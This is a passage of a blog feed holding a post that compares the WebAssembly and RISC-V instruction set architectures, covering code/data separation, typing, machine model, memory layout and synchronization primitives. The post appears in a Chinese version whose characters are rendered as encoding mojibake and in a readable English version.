Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="WebAssembly ‰∏é RISC-V Êåá‰ª§ÈõÜÊû∂ÊûÑÁöÑÂØπÊØî"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/wasm-riscv.png" alt="WebAssembly ‰∏é RISC-V Êåá‰ª§ÈõÜÊû∂ÊûÑÁöÑÂØπÊØî"><p>WebAssembly ‰∏é RISC-V ÈÉΩÊòØËøëÂçÅÂπ¥ÂÜÖÊñ∞Âá∫Áé∞ÁöÑÊåá‰ª§ÈõÜÊû∂ÊûÑ„ÄÇÊëòÂΩï‰∏ÄÊÆµ <a href="https://webassembly.org/">WebAssembly ÂÆòÊñπÁΩëÁ´ô</a>ÁöÑ‰ªãÁªçÔºö</p><blockquote>WebAssembly (abbreviated <em><em>Wasm</em></em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><blockquote>WebAssembly ÔºàÁÆÄÂÜô‰∏∫ WasmÔºâÊòØ‰∏ÄÁßçÊ†àËôöÊãüÊú∫ÁöÑ‰∫åËøõÂà∂Êåá‰ª§Ê†ºÂºè„ÄÇWasm Ë¢´ËÆæËÆ°‰∏∫ C/C++/Rust Á≠âÈ´òÁ∫ßËØ≠Ë®ÄÁöÑÂèØÁßªÊ§çÁºñËØëÁõÆÊ†áÔºå‰ªéËÄåÂÖÅËÆ∏ÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®Â∫îÁî®Á®ãÂ∫èÈÉ®ÁΩ≤Âú® Web ‰∏ä„ÄÇ</blockquote><p>Âíå <a href="https://riscv.org/">RISC-V ÁöÑÂÆòÊñπ‰ªãÁªç</a>Ôºö</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><blockquote>RISC-V ÊòØ‰∏ÄÁßçËá™Áî±„ÄÅÂºÄÊîæÁöÑÊåá‰ª§ÈõÜÊû∂ÊûÑÔºåÈÄöËøáÂºÄÊîæÊ†áÂáÜÂçè‰Ωú‰ΩøÊñ∞ÁöÑÂ§ÑÁêÜÂô®ÂàõÊñ∞Êàê‰∏∫ÂèØËÉΩ„ÄÇRISC-V Êù•Ëá™Â≠¶ÊúØÁ†îÁ©∂ÔºåÊèê‰æõ‰∫ÜÊõ¥Âä†Ëá™Áî±„ÄÅÂèØÊâ©Â±ïÁöÑËΩØÁ°¨‰ª∂Êû∂ÊûÑÔºå‰∏∫Êú™Êù• 50 Âπ¥ÁöÑËÆ°ÁÆóÊäÄÊúØËÆæËÆ°‰∏éÂàõÊñ∞Èì∫Âπ≥ÈÅìË∑Ø„ÄÇ</blockquote><p>Ëøô‰∏§ÁßçÊåá‰ª§ÈõÜÊû∂ÊûÑÁúãËµ∑Êù•Âæà‰∏ç‰∏ÄÊ†∑„ÄÇWebAssembly ÁöÑÁõÆÊ†áÂπ≥Âè∞‰∏ªË¶ÅÊòØ JIT ÁºñËØëÂô®Ôºà‰ª•ÂèäÊµèËßàÂô®ÔºâÔºõËÄå RISC-V Âàô‰∏ì‰∏∫Á°¨‰ª∂ËÆæËÆ°ÔºåÂÖ∂ÁõÆÊ†á‰πã‰∏ÄÂç≥ÊòØÂú® FPGA ÂíåÁîµË∑Ø‰∏äÁöÑÈ´òÊïàÂÆûÁé∞„ÄÇWebAssembly ‰∏é RISC-V ÁöÑÂÖ≥Á≥ª‰ºº‰πéÁ±ª‰ºº‰∫éÊó©ÊúüÁöÑ Java ‰∏é x86Ôºö‰∏ÄÁßçÂ≠óËäÇÁ†ÅÊ†ºÂºèÔºåÂíå‰∏Ä‰∏™Á°¨‰ª∂Êåá‰ª§ÈõÜ„ÄÇÂÆÉ‰ª¨Êúâ‰ªÄ‰πàÂÖ≥Á≥ªÂë¢Ôºü</p><p>ÂÖ∂ÂÆûÂ≠óËäÇÁ†ÅÊ†ºÂºè‰∏éÁ°¨‰ª∂Êåá‰ª§ÈõÜÁöÑÂàÜÁïåÁ∫øÂπ∂‰∏çÊòØÈùûÂ∏∏Ê∏ÖÊô∞„ÄÇ‰æãÂ¶ÇÂú® x86 Êåá‰ª§ÈõÜÁöÑÊó©ÊúüÂÆûÁé∞‰∏≠ÔºåÊåá‰ª§ÁªèËøá‰∏ÄÂ±ÇËß£Á†ÅÁõ¥Êé•Ë¢´ÂàÜÂèëÂà∞ÊâßË°åÁîµË∑ØÂéªÊâßË°å„ÄÇ‰ΩÜËøëÂπ¥ÁöÑ Intel/AMD CPU ÈááÁî®‰∫Ü‰∏çÂêåÁöÑÊâßË°åÁ≠ñÁï•ÔºöÊØèÊù° x86 Êåá‰ª§È¶ñÂÖàË¢´ÁøªËØë‰∏∫ÊüêÁßçÂÜÖÈÉ® RISC Êåá‰ª§ÔºåÊâßË°åÁªÑ‰ª∂Êî∂Âà∞ÁöÑÊåá‰ª§ÂÖ∂ÂÆûÂ∑≤ÁªèÊòØÁøªËØëÂêéÁöÑ RISC ÁºñÁ†ÅÊ†ºÂºè„ÄÇËøôÂÆûÈôÖ‰∏äÁõ∏ÂΩì‰∫é‰ªé x86 Âà∞ÂÜÖÈÉ® RISC Êåá‰ª§ÈõÜÁöÑÊüêÁßç‚ÄúÁ°¨‰ª∂ÂÆûÊó∂ÁºñËØë‚ÄùËøáÁ®ã„ÄÇÂêåÊó∂Ôºå<a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> ‰∏é <a href="https://github.com/piranna/wasmachine">WebAssembly</a> ‰πüÊúâÂÆûÈ™åÊÄßÁöÑÁ°¨‰ª∂ÂÆûÁé∞ÔºåËôΩÁÑ∂ÂÆÉ‰ª¨Ëøò‰∏çËÉΩËµ∂‰∏ä JIT ÁºñËØëÂô®Âú®Áé∞‰ª£ CPU ‰∏äÊâÄËÉΩËææÂà∞ÁöÑÊïàÁéá„ÄÇ</p><blockquote>Êàë‰ª¨Â∑≤ÁªèÂèØ‰ª•ÁúãÂà∞ RISC-V Êåá‰ª§ÈõÜ<a href="https://github.com/nervosnetwork/ckb-vm">Ë¢´Áî®‰∫éÂå∫ÂùóÈìæÁöÑÊô∫ËÉΩÂêàÁ∫¶</a>ÔºåËÄå WebAssembly Ê≠§ÂâçÂá†‰πéÊòØÂéüÁîüËØ≠Ë®ÄÊô∫ËÉΩÂêàÁ∫¶ÁöÑÂîØ‰∏ÄÈÄâÊã©„ÄÇ</blockquote><p>Âú®ËøôÈáåÊàë‰ª¨ÂØπ WebAssembly ‰∏é RISC-V ÂÅö‰∏Ä‰∏™ÊØîËæÉ„ÄÇ</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">ÂºÄÊ∫ê</font></strong></td>
<td>ÊòØ</td>
<td>ÊòØ</td>
</tr>
<tr>
<td><strong><font color="#512da8">ÂÜÖÂ≠òÊû∂ÊûÑ</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">ÊµÆÁÇπÊîØÊåÅ</font></strong></td>
<td>ÊòØ</td>
<td>ÊòØ (ÂÆö‰πâ‰∫éÊâ©Â±ï)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>ÊòØ</td>
<td>ÊòØ (ÂÆö‰πâ‰∫éÊâ©Â±ï)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">‰ª£Á†Å/Êï∞ÊçÆÂàÜÁ¶ª</font></strong></td>
<td>ÊòØ</td>
<td>Âê¶</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÊåáÈíàÂÆΩÂ∫¶</font></strong></td>
<td>32</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÊúÄÂ§ßÊï∞ÊçÆÂÆΩÂ∫¶</font></strong></td>
<td>64</td>
<td>32/64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÈùôÊÄÅÁ±ªÂûã</font></strong></td>
<td>Âº±</td>
<td>Êó†</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÊéßÂà∂ÊµÅÁ∫¶Êùü</font></strong></td>
<td>ÊòØ</td>
<td>Âê¶</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Êú∫Âô®Ê®°Âûã</font></strong></td>
<td>Ê†àÊú∫</td>
<td>ÂØÑÂ≠òÂô®Êú∫</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÂÜÖÂ≠òÂ∏ÉÂ±Ä</font></strong></td>
<td>Á∫øÊÄß</td>
<td>ÂàÜÈ°µ</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÂÜÖÂ≠ò‰øùÊä§</font></strong></td>
<td>Êó†</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Â§öÁ∫øÁ®ãÂêåÊ≠•</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Êåá‰ª§ÁºñÁ†Å</font></strong></td>
<td>ÂèòÈïø</td>
<td>ÂÆöÈïø (2 Êàñ 4 Â≠óËäÇ)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">‰∏éÁéØÂ¢É‰∫§‰∫í</font></strong></td>
<td>ÂØºÂÖ•ÂáΩÊï∞</td>
<td>Á≥ªÁªüË∞ÉÁî®</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">ÂèØÊâßË°åÊò†ÂÉèÊ†ºÂºè</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p><strong>1. ‰ª£Á†Å/Êï∞ÊçÆÂàÜÁ¶ª</strong></p><p>ÂåÖÊã¨ RISC-V Âú®ÂÜÖÁöÑÂ§ßÂ§öÊï∞Áé∞‰ª£Êû∂ÊûÑÂØπ‰ª£Á†ÅÂíåÊï∞ÊçÆ‰ΩøÁî®Âêå‰∏Ä‰∏™Âú∞ÂùÄÁ©∫Èó¥Ôºå‰ΩÜÊòØ WebAssembly Ê≤°ÊúâËøôÊ†∑ÂÅö„ÄÇÂÆûÈôÖ‰∏äÔºåËøêË°å‰∏≠ÁöÑ‰ª£Á†ÅÁîöËá≥Ê≤°ÊúâÂäûÊ≥ïËØª/ÂÜôÂÆÉËá™Â∑±„ÄÇËøô‰∏™ËÆæËÆ°ÁöÑÂéüÂõ†ÂèØËÉΩÊòØÔºö</p><ul><li>ÁÆÄÂåñ JIT ÁºñËØëÂô®ÁöÑÂÆûÁé∞„ÄÇÂ¶ÇÊûú‰ª£Á†ÅÂèØ‰ª•Ëá™Êàë‰øÆÊîπÔºåÈÇ£‰πà JIT ÁºñËØëÂô®ÂàôÈúÄË¶ÅÊúâÊ£ÄÊµã‰øÆÊîπÂíåÈáçÊñ∞ÁîüÊàêÁõÆÊ†á‰ª£Á†ÅÁöÑËÉΩÂäõÔºåËÄåËøôÈúÄË¶ÅÁõ∏ÂΩìÂ§çÊùÇÁöÑÂÆûÁé∞Êú∫Âà∂„ÄÇ</li><li>WebAssembly ÂÅáËÆæ‰∫Ü‰∏Ä‰∏™ÂäüËÉΩÂÆåÂñÑÁöÑËøêË°åÁéØÂ¢É„ÄÇËøêË°åÁéØÂ¢É‰ºöÂ§ÑÁêÜÈìæÊé•„ÄÅÈáçÂÆö‰ΩçÁ≠âÂáÜÂ§áÂ∑•‰ΩúÔºåÁ®ãÂ∫è‰∏çÈúÄË¶ÅÂÖ≥ÂøÉÊÄéÊ†∑ÊääÂÆÉËá™Â∑±ËøêË°åËµ∑Êù•„ÄÇ</li><li>ÂÆâÂÖ®„ÄÇËÉΩÂ§üÂä®ÊÄÅÁîüÊàêÂíå‰øÆÊîπÁöÑ‰ª£Á†ÅÊòØ‰∏™ÂæàÂç±Èô©ÁöÑÊîªÂáªÁÇπ„ÄÇ</li></ul><p><strong>2. ÈùôÊÄÅÁ±ªÂûã‰∏éÊéßÂà∂ÊµÅÁ∫¶Êùü</strong></p><p>WebAssembly ÂÖ∑ÊúâÂæàÂº∫ÁöÑ‚ÄúÁªìÊûÑÊÄß‚Äù„ÄÇÂÖ∂Ê†áÂáÜË¶ÅÊ±ÇÊâÄÊúâÂáΩÊï∞Ë∞ÉÁî®„ÄÅÂæ™ÁéØ„ÄÅË∑≥ËΩ¨ÂíåÂÄºÁ±ªÂûãÈÅµÂæ™ÁâπÂÆöÁöÑÁªìÊûÑÁ∫¶ÊùüÔºå‰æãÂ¶ÇÂêë‰∏Ä‰∏™Êé•Âèó‰∏â‰∏™ÂèÇÊï∞ÁöÑÂáΩÊï∞‰º†ÂÖ•‰∏§‰∏™ÂèÇÊï∞„ÄÅË∑≥ËΩ¨Âà∞ÂÖ∂‰ªñÂáΩÊï∞ÈáåÁöÑÊüê‰∏™‰ΩçÁΩÆ„ÄÅÂú®‰∏§‰∏™Êï¥Êï∞‰∏äÊâßË°åÊµÆÁÇπÂä†Êìç‰ΩúÁ≠âÈÉΩ‰ºöÂØºËá¥ÁºñËØë/È™åËØÅÂ§±Ë¥•„ÄÇRISC-V Âàô‰∏çÂÖ∑ÊúâÊ≠§Á±ªÁ∫¶ÊùüÔºåÊåá‰ª§ÁöÑÊúâÊïà‰∏éÂê¶Âè™ÂèñÂÜ≥‰∫éÂÖ∂Ëá™Ë∫´ÁöÑÁºñÁ†ÅÊòØÂê¶Ê≠£Á°Æ„ÄÇ</p><p><strong>3. Êú∫Âô®Ê®°Âûã</strong></p><p>WebAssembly ÊòØ‰∏ÄÁßç<a href="https://en.wikipedia.org/wiki/Stack_machine">Ê†àÊú∫</a>Êåá‰ª§ÈõÜÔºåËÄå RISC-V ÊòØ‰∏ÄÁßç<a href="https://en.wikipedia.org/wiki/Register_machine">ÂØÑÂ≠òÂô®Êú∫</a>Êåá‰ª§ÈõÜ„ÄÇ</p><p>Âú® WebAssembly ‰∏≠ÔºåÊØèÊù°Êåá‰ª§<em>ËØ≠‰πâ‰∏ä</em>‰ºö‰ªéÂÄºÊ†à‰∏äÂºπÂá∫ÂÆÉÁöÑÊìç‰ΩúÊï∞ÔºåÁÑ∂ÂêéÂ∞ÜÁªìÊûúÊé®ÂÖ•ÂÄºÊ†à„ÄÇÁÑ∂ËÄå‰∏é Java Á≠âÂÖ∂‰ªñÂü∫‰∫éÊ†àÊú∫ÁöÑÂ≠óËäÇÁ†ÅÊ†ºÂºè‰∏çÂêåÁöÑÊòØÔºåÁ®ãÂ∫è‰∏≠‰ªªÊÑèÊåá‰ª§Â§ÑÂÄºÊ†àÁöÑÁªìÊûÑÈÉΩÂèØ‰ª•Ë¢´ÈùôÊÄÅÁ°ÆÂÆö„ÄÇËøô‰∏ÄËÆæËÆ°ÊúâÂà©‰∫éÊõ¥Â•ΩÁöÑÁºñËØë‰ºòÂåñ„ÄÇ</p><p>Âú® RISC-V ‰∏≠ÔºåÊØèÊù°Êåá‰ª§ÁöÑÁºñÁ†ÅÂåÖÂê´ 0 - 3 ‰∏™ÂØÑÂ≠òÂô®ÁºñÂè∑ <code>rd, rs1, rs2</code> „ÄÇÂÖ∂‰∏≠ <code>rs1</code>‰∏é <code>rs2</code> ÊòØËæìÂÖ•ÂØÑÂ≠òÂô®Ôºå <code>rd</code> ÊòØËæìÂá∫ÂØÑÂ≠òÂô®„ÄÇÈô§ÂÜÖÂ≠òËÆøÈóÆ„ÄÅÁâπÊùÉÊåá‰ª§Á≠âÁâπÊÆäÁ±ªÂûãÊåá‰ª§Â§ñÔºåÊØèÊù°Êåá‰ª§Âè™‰ªéËæìÂÖ•ÂØÑÂ≠òÂô®‰∏≠ËØªÂèñÊï∞ÊçÆÔºåÂú®ËæìÂá∫ÂØÑÂ≠òÂô®‰∏≠Â≠òÊîæÁªìÊûú„ÄÇ</p><p><strong>4. ÂÜÖÂ≠òÁÆ°ÁêÜ</strong></p><p>ËôΩÁÑ∂ WebAssembly ‰∏é RISC-V ÈÉΩÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Êó†Á±ªÂûãÁöÑ„ÄÅÂ≠óËäÇÂèØÂØªÂùÄÁöÑÂÜÖÂ≠òÔºåÂÆÉ‰ª¨‰πãÈó¥ËøòÊòØÊúâ‰∏Ä‰∫õÁªÜËäÇ‰∏äÁöÑÂå∫Âà´„ÄÇWebAssembly ÁöÑÂÜÖÂ≠òÁ≠âÂêå‰∫é‰∏Ä‰∏™Â§ßÊï∞ÁªÑÔºöÊúâÊïàÂú∞ÂùÄ‰ªé 0 ÂºÄÂßãÔºåËøûÁª≠Êâ©Â±ïÂà∞Êüê‰∏™Áî±Á®ãÂ∫èÂÆö‰πâÂàùÂÄº„ÄÅÂèØÂ¢ûÈïøÁöÑ‰∏äÈôê„ÄÇËÄå RISC-V Âàô‰ΩøÁî®‰∫Ü<a href="https://en.wikipedia.org/wiki/Virtual_memory">ËôöÊãüÂÜÖÂ≠ò</a>ÔºåÁî®È°µË°®Â∞ÜÂú∞ÂùÄÊò†Â∞ÑÂà∞Áâ©ÁêÜÂÜÖÂ≠ò„ÄÇ</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="WebAssembly ‰∏é RISC-V Êåá‰ª§ÈõÜÊû∂ÊûÑÁöÑÂØπÊØî"><figcaption>ÂÜÖÂ≠òÂ∏ÉÂ±Ä</figcaption></figure><p>WebAssembly ÁöÑÂÜÖÂ≠òËÆæËÆ°ËôΩÁÑ∂ÁÆÄÊ¥Å‰∏îÊòì‰∫éÂÆûÁé∞Ôºå‰ΩÜÂ≠òÂú®‰∏Ä‰∫õÈóÆÈ¢òÔºö</p><ul><li>Âú∞ÂùÄ 0 ÊòØÊúâÊïàÁöÑÔºåËøô‰ºöÂØºËá¥‰∏Ä‰∫õÁ®ãÂ∫èÂú®Ëß£ÂºïÁî®Á©∫ÊåáÈíàÊó∂ÁöÑË°å‰∏∫‰∏éÈ¢ÑÊúü‰∏çÂêå„ÄÇ</li><li>Êó†Ê≥ïÂª∫Á´ã‰∏çÊò†Â∞ÑÂà∞‰ªª‰ΩïÁâ©ÁêÜÂú∞ÂùÄÁöÑ‚ÄúÊó†Êïà‚ÄùÂú∞ÂùÄÂå∫Èó¥ÔºåÂõ†Ê≠§Êó†Ê≥ïÂÆûÁé∞Â§öÁ∫øÁ®ãÁéØÂ¢É‰∏ãÁöÑÊ†à‰øùÊä§È°µ (guard page) „ÄÇ</li></ul><p><strong>5. ÂêåÊ≠•Êú∫Âà∂</strong></p><p>ÂõæÁÅµÂÆåÂ§áÁöÑËÆ°ÁÆóÊú∫Âô®ÈúÄË¶ÅËá≥Â∞ë‰∏ÄÊù°Êù°‰ª∂ÂàÜÊîØÊåá‰ª§„ÄÇÂêåÊ†∑ÔºåÊîØÊåÅÂ§öÁ∫øÁ®ãÂêåÊ≠•ÁöÑÊåá‰ª§ÈõÜÊû∂ÊûÑÈúÄË¶ÅËá≥Â∞ë‰∏ÄÊù°‚ÄúÂéüÂ≠êÊù°‰ª∂ÂàÜÊîØ‚ÄùÊåá‰ª§„ÄÇËøôÁ±ªÊåá‰ª§Âú® WebAssembly ‰∏ãÊòØ <code>i{32,64}.atomic.rmw.cmpxchg</code>ÔºåÂú® RISC-V ‰∏ãÊòØ <code>LR/SC</code>ÔºåÂàÜÂà´ÂØπÂ∫î <a href="https://en.wikipedia.org/wiki/Compare-and-swap">CAS</a> Ê®°ÂûãÂíå <a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LL/SC</a> Ê®°Âûã„ÄÇ</p><p>LL/SC ÁöÑËØ≠‰πâÊØî CAS Êõ¥Âº∫„ÄÇCAS Â≠òÂú®Èöæ‰ª•Ëß£ÂÜ≥ÁöÑ <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA ÈóÆÈ¢ò</a>Ôºå‰ΩÜ LL/SC ‰∏çÂèóÂΩ±Âìç„ÄÇËøô‰πüÊÑèÂë≥ÁùÄÂú® CAS Êû∂ÊûÑ‰∏äÊ®°Êãü LL/SC ÊØîÂèçËøáÊù•Ë¶ÅÂõ∞ÈöæÂæàÂ§ö„ÄÇ</p><hr><blockquote>Note: ÊàëÂÜôËøá‰∏Ä‰∏™ RISC-V Ëß£ÈáäÂô® <a href="https://github.com/losfair/FlatRv">FlatRv</a> Ôºå‰∏îÊ≠£Âú®ÂèÇ‰∏é‰∏Ä‰∏™ WebAssembly JIT ËøêË°åÁéØÂ¢É <a href="https://github.com/wasmerio/wasmer">Wasmer</a> ÁöÑÂºÄÂèë„ÄÇÂ¶ÇÊûú‰Ω†ÊÑüÂÖ¥Ë∂£ÂèØ‰ª•ÁÇπ‰∏™ Star :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant ‰∏≠Êñá]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[A Comparison between WebAssembly and RISC-V]]></title>
        <updated>2020-03-13T16:38:53+08:00</updated>
        <link href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="A Comparison between WebAssembly and RISC-V"><p><a href="https://webassembly.org/">WebAssembly</a> and <a href="https://riscv.org/">RISC-V</a> are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Quoting the introduction to WebAssembly on <a href="https://webassembly.org">webassembly.org</a>:</p><blockquote>WebAssembly (abbreviated <em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><p>and the introduction to RISC-V on <a href="https://riscv.org">riscv.org</a>:</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><p>It seems that these two ISAs are quite different. WebAssembly is primarily targeted at JIT compilation and in particular, browsers, while RISC-V is designed for hardware and one of its goals is efficient implementation on FPGAs and circuits. They're like Java and x86 respectively in the old days: A bytecode format, and a hardware instruction set. How can they be related?</p><p>Well, the boundary between bytecodes and real hardware instruction sets is actually a bit blurred. The x86 instruction set, for example, was once executed directly by the circuits that performs control and arithmetic operations. But now on newer Intel and AMD CPUs, x86 instructions are decoded into a internal RISC format on-the-fly and sent into a RISC core for execution - isn't it some kind of hardware "JIT compilation" similar to what JRE does for Java? Meanwhile, there are also experimental hardware implementations for <a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> and <a href="https://github.com/piranna/wasmachine">WebAssembly</a>, though not being as efficient as what a JIT compiler can achieve on a modern, mature CPU.</p><p>Actually, people are already using RISC-V in a position where WebAssembly has usually been used for: smart contract on blockchains. It is the <a href="https://github.com/nervosnetwork/ckb-vm">CKB VM</a>. Across the blurred line between the WebAssembly bytecode format and the RISC-V hardware instruction set, what are the similarities, and what are the differences?</p><p>Let's do a comparison.</p><h3 id="feature-table">Feature table</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">Open source</font></strong></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><strong><font color="#512da8">Memory architecture</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">Floating point</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Separated code and data</font></strong></td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Pointer width</font></strong></td>
<td>32</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Maximum data width</font></strong></td>
<td>64</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Typing</font></strong></td>
<td>Weak</td>
<td>None</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Control flow</font></strong></td>
<td>Restricted</td>
<td>Arbitrary</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Machine model</font></strong></td>
<td>Stack</td>
<td>Register</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory layout</font></strong></td>
<td>Linear</td>
<td>Paged</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory protection</font></strong></td>
<td>None</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Synchronization primitive</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Instruction encoding</font></strong></td>
<td>Variable length</td>
<td>Fixed length (2 or 4 bytes)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Interaction with environment</font></strong></td>
<td>Imported functions</td>
<td>System call</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Executable image format</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The similarities are quite common, so I will focus on the differences here.</p><p><strong>1. Separated code and data</strong></p><p>Most modern architectures use a unique addressing space for code and data, including RISC-V. But WebAssembly doesn't, and actually the running code is not even provided with a way to access itself. Possible reasons:</p><ul><li>Simplicity for JIT compilation. If code can modify itself, then the JIT compiler needs to detect the modification and update the corresponding machine code - which is very complex.</li><li>WebAssembly's assumption about a powerful host environment. Linking, etc. will be done entirely by the host, and the program doesn't need to care about bringing itself up.</li><li>Security. Generating code at runtime is dangerous.</li></ul><p><strong>2. Typing and control flow</strong></p><p>WebAssembly is very "structured": The JIT compiler requires all function calls, loops, jumps and value types to conform to structural constraints. For example, you can't pass two values to a function that accepts three arguments, you can't jump to a location in another function, and you can't execute the floating point add instruction on two integers.</p><p>RISC-V however has none of these constraints. Everything is just values in registers and it's up to the programmer to decide how to use them.</p><p><strong>3. Machine model</strong></p><p>WebAssembly is built upon the <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> model, while RISC-V (along with most other hardware architectures) is a <a href="https://en.wikipedia.org/wiki/Register_machine">register machine</a>.</p><p>In WebAssembly, <em>semantically</em> any instruction pops its operands (if any) from the value stack, performs the defined operation, and pushes its results (if any) back on to the value stack. However, the structure of the value stack at any point in the program can be statically determined - which is different from the Java bytecode, for example, in that keeping the stack structure statically determinable is not an optimization but a compile-time mandatory requirement.</p><p><strong>4. Memory</strong></p><p>While both ISAs define an untyped, byte-addressable memory, some details are different. Memory in WebAssembly is literally a large byte array: addresses start from zero and continuously span to an upper limit (which can be dynamically increased by executing an instruction). In comparison, RISC-V uses <em><a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a></em> where page tables are used to map addresses to the underlying physical memory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="A Comparison between WebAssembly and RISC-V"><figcaption>Memory layouts</figcaption></figure><p>WebAssembly's memory model, although being simple to implement and efficient when JIT compiled, has several issues compared to RISC-V:</p><ul><li>Address zero is valid, causing programs that assume a crash for dereferencing the null pointer to misbehave.</li><li>No "gaps" are possible. Therefore the guard page trick to prevent stack overflow in a multi-threaded environment won't work.</li></ul><p>Virtual memory usually comes with memory protection where each memory page has a combination of <em>read</em>, <em>write</em> and <em>execute</em> permissions. This is an important security mechanism because it prevents execution and writes on memory regions where such operations aren't expected. RISC-V implements memory protection but WebAssembly does not - maybe it's less important in an architecture where executable code isn't addressable?</p><p><strong>5. Synchronization</strong></p><p>A computing machine needs at least one conditional branch instruction to be turing complete. Similarly, a multiprocessor architecture needs at least one "atomic conditional branch" instruction for proper synchronization. This instruction is <code>i{32,64}.atomic.rmw.<a href="https://en.wikipedia.org/wiki/Compare-and-swap">cmpxchg</a></code> in WebAssembly, and <code><a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LR/SC</a></code> in RISC-V.</p><p><code>LR/SC</code> has stronger semantics than <code>cmpxchg</code>. With <code>cmpxchg</code> we have the famous <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>, but <code>LR/SC</code> is not affected. It also means that emulating <code>LR/SC</code> with a <code>cmpxchg</code>-only architecture is much more difficult than the other way; something like a global lock or transactional memory has to be used, greatly increasing the complexity. RISC-V is designed for hardware anyway, but if you ever want to write a software implementation you will have to work around this issue.</p><hr><blockquote>Side note: I worked on/am working on both a RISC-V interpreter, <a href="https://github.com/losfair/FlatRv">FlatRv</a>, and a full WebAssembly JIT runtime, <a href="https://github.com/wasmerio/wasmer">Wasmer</a>. Take a look at them and star if you like my work :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html</id>
        <title><![CDATA[Áî® OpenResty+OpenCC ËÆ©ÁΩëÁ´ôÊîØÊåÅÊ≠£‰Ωì‰∏≠Êñá]]></title>
        <updated>2020-02-29T12:30:00+08:00</updated>
        <link href="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"/>
